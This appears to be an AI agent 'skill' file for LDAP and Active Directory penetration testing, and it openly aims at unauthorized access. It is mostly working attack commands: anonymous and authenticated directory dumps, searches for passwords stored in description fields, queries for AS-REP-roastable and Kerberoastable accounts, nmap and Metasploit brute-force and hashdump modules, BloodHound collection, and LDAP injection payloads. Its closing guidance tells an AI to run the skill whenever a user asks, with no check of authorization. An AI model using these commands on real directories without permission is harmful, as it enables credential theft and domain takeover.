# LDAP Pentesting Skill

## Goal

Enumerate and exploit LDAP (Lightweight Directory Access Protocol) services to extract user information, password hashes, and gain unauthorized access to directory services.

## Methodology

1. **Discovery**: Identify LDAP services and determine if anonymous bind is allowed
2. **Base DN Discovery**: Find the base Distinguished Name
3. **Enumeration**: Extract users, groups, computers, and other objects
4. **Credential Attacks**: Bruteforce passwords or extract hashes
5. **Exploitation**: Leverage misconfigurations for privilege escalation

## Ports

- 389/TCP: LDAP (unencrypted)
- 636/TCP: LDAPS (SSL/TLS)
- 3268/TCP: Global Catalog
- 3269/TCP: Global Catalog over SSL

## Tools

* **ldapsearch**: LDAP query tool
* **ldapdomaindump**: Active Directory enumeration
* **windapsearch**: Python-based AD enumeration
* **nmap**: LDAP scripts
* **Metasploit**: LDAP modules
* **BloodHound**: AD attack path visualization

## Example Commands

```bash
# Nmap LDAP enumeration
nmap -p389,636,3268,3269 --script ldap-* target
nmap -p389 --script ldap-rootdse target
nmap -p389 --script ldap-search target

# Check for anonymous bind
ldapsearch -x -H ldap://target -s base namingContexts
ldapsearch -x -H ldap://target -b "" -s base "(objectclass=*)"

# Get base DN
ldapsearch -x -H ldap://target -s base namingcontexts

# Anonymous enumeration
ldapsearch -x -H ldap://target -b "DC=domain,DC=com" "(objectclass=*)"

# Authenticated search
ldapsearch -x -H ldap://target -D "CN=user,DC=domain,DC=com" -w password -b "DC=domain,DC=com"

# Simple authentication
ldapsearch -x -H ldap://target -D "user@domain.com" -w password -b "DC=domain,DC=com"

# Get all users
ldapsearch -x -H ldap://target -b "DC=domain,DC=com" "(objectclass=user)" sAMAccountName

# Get all groups
ldapsearch -x -H ldap://target -b "DC=domain,DC=com" "(objectclass=group)" cn

# Get all computers
ldapsearch -x -H ldap://target -b "DC=domain,DC=com" "(objectclass=computer)" cn

# Users with descriptions (often contain passwords)
ldapsearch -x -H ldap://target -b "DC=domain,DC=com" "(objectclass=user)" sAMAccountName description
```

## Active Directory Enumeration

```bash
# ldapdomaindump (comprehensive AD dump)
ldapdomaindump -u 'domain\user' -p 'password' target

# This creates HTML files with:
# - domain_users.html
# - domain_groups.html
# - domain_computers.html
# - domain_policy.html

# windapsearch
python3 windapsearch.py -d domain.com --dc-ip target -u user -p password --users
python3 windapsearch.py -d domain.com --dc-ip target -u user -p password --groups
python3 windapsearch.py -d domain.com --dc-ip target -u user -p password --computers
python3 windapsearch.py -d domain.com --dc-ip target -u user -p password --privileged-users
python3 windapsearch.py -d domain.com --dc-ip target -u user -p password --unconstrained
```

## Password Extraction

```bash
# Extract users with "Password" in description
ldapsearch -x -H ldap://target -D "user@domain.com" -w password -b "DC=domain,DC=com" "(objectclass=user)" description | grep -i password

# AS-REP roastable users (no preauth required)
ldapsearch -x -H ldap://target -D "user@domain.com" -w password -b "DC=domain,DC=com" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# Get userAccountControl for Kerberoastable users
ldapsearch -x -H ldap://target -D "user@domain.com" -w password -b "DC=domain,DC=com" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

## LDAP Injection

```bash
# Test for LDAP injection
# If application uses LDAP for authentication
# Try: *)(uid=*))(|(uid=*
# Or:  admin)(&)
# Or:  *))%00

# Example vulnerable query: (&(uid=USER)(password=PASS))
# Inject: *)(uid=*))(|(uid=*
# Becomes: (&(uid=*)(uid=*))(|(uid=*)(password=PASS))
```

## Useful LDAP Filters

```bash
# All users
"(objectclass=user)"

# All groups
"(objectclass=group)"

# All computers
"(objectclass=computer)"

# Specific user
"(sAMAccountName=admin)"

# Users in specific group
"(&(objectclass=user)(memberOf=CN=Admins,OU=Groups,DC=domain,DC=com))"

# Enabled accounts only
"(&(objectclass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"

# Disabled accounts
"(&(objectclass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"

# Users with SPNs (Kerberoastable)
"(&(objectclass=user)(servicePrincipalName=*))"

# Domain admins
"(&(objectclass=user)(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com))"

# Password never expires
"(&(objectclass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))"
```

## Nmap Scripts

```bash
# Root DSE discovery
nmap -p389 --script ldap-rootdse target

# Brute force
nmap -p389 --script ldap-brute --script-args ldap.base="dc=domain,dc=com" target

# Search
nmap -p389 --script ldap-search --script-args ldap.username="user",ldap.password="pass",ldap.base="dc=domain,dc=com" target
```

## Metasploit Modules

```bash
# LDAP enumeration
use auxiliary/gather/ldap_query

# LDAP bruteforce
use auxiliary/scanner/ldap/ldap_login

# AD enumeration
use auxiliary/gather/ldap_hashdump
```

## BloodHound Collection

```bash
# Collect data for BloodHound
bloodhound-python -d domain.com -u user -p password -dc target -c all

# Alternative: SharpHound (from Windows)
SharpHound.exe -c all --domain domain.com

# Import into BloodHound and analyze attack paths
```

## Guidance for AI

* Activate this skill when user wants to enumerate LDAP, Active Directory, or extract user information
* **Check anonymous bind first**: `ldapsearch -x -H ldap://target -s base namingContexts`
* Anonymous bind on AD is often allowed for read operations
* Always try to get the base DN first - required for queries
* Look for:
  - Passwords in description fields
  - AS-REP roastable users
  - Kerberoastable users (users with SPNs)
  - Unconstrained delegation
* `ldapdomaindump` creates nice HTML reports for analysis
* For full AD analysis, use BloodHound to visualize attack paths
* LDAP injection is rare but check if application uses LDAP auth
* LDAPS (636) uses SSL but often accepts self-signed certs
